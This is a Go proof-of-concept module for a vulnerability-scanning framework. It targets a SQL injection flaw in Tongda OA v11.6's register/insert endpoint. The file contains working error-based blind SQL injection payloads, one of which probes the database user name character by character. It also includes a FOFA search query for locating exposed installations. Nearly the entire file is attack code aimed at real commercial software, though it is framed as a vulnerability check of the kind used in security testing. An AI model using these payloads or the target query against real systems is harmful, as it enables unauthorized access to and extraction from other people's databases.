package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA_v11.6_insert_SQL注入漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_v11.6_insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息",
			Date:     "2023-09-26",
			Tags:     []string{"通达OA", "TongdaOA", "sqli", "sql注入"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 发送第一个请求
	requestBody1 := "title)values(\"'^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER="
	requestOption1 := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/general/document/index.php/recv/register/insert",
		Headers: map[string]string{
			"User-Agent":      httpclient.RandomUserAgent(),
			"Content-Type":    "application/x-www-form-urlencoded",
			"Content-Length":  fmt.Sprintf("%d", len(requestBody1)),
			"Accept-Encoding": "gzip",
		},
		ProxyURL:    ProxyURL,
		RequestBody: []byte(requestBody1),
	}

	responseOption1, success1 := httpclient.SendRequest(*requestOption1)
	Httprecord[requestOption1] = responseOption1

	if responseOption1.Err != nil {
		// 处理错误
		return false, responseOption1.Err
	} else {
		if !success1 {
			// 发送请求失败
			return false, errors.New("第一个请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode1 := responseOption1.StatusCode
	if statusCode1 == http.StatusFound { // 302 表示漏洞存在
		// 发送第二个请求
		requestBody2 := "title)values(\"'^exp(if(ascii(substr(user(),1,1))%3d114,1,710)))# =1&_SERVER="
		requestOption2 := &httpclient.RequestOptions{
			Method: http.MethodPost,
			URL:    Target + "/general/document/index.php/recv/register/insert",
			Headers: map[string]string{
				"User-Agent":      httpclient.RandomUserAgent(),
				"Content-Type":    "application/x-www-form-urlencoded",
				"Content-Length":  fmt.Sprintf("%d", len(requestBody2)),
				"Accept-Encoding": "gzip",
			},
			ProxyURL:    ProxyURL,
			RequestBody: []byte(requestBody2),
		}

		responseOption2, success2 := httpclient.SendRequest(*requestOption2)
		Httprecord[requestOption2] = responseOption2

		if responseOption2.Err != nil {
			// 处理错误
			return false, responseOption2.Err
		} else {
			if !success2 {
				// 发送请求失败
				return false, errors.New("第二个请求失败")
			}
		}

		statusCode2 := responseOption2.StatusCode
		if statusCode2 == http.StatusOK {
			// 检查响应包内容是否包含 "SQL语句执行错误" 字符串
			responseBody2 := string(responseOption2.Body)
			if strings.Contains(responseBody2, "SQL语句执行错误") {
				return true, nil
			}
		}
	}
	return false, nil
}
